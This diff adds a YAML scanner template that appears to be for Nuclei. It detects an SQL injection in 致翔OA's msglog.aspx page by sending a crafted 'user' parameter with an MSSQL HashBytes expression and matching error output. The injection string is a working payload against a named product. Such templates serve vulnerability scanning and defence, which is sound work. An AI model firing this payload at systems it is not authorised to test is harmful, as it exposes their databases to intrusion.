@@ -1,0 +1,28 @@
+id: poc-yaml-zxoa-msglog-aspx-sqli
+info:
+  name: 致翔OA msglog.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /mainpage/msglog.aspx?user=1%27+and+(SELECT+sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,+%27{{t1}}%27)))%3d1+-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "nvarchar"
+          - "SqlException"
+          - "{{t2}}"
+        part: body
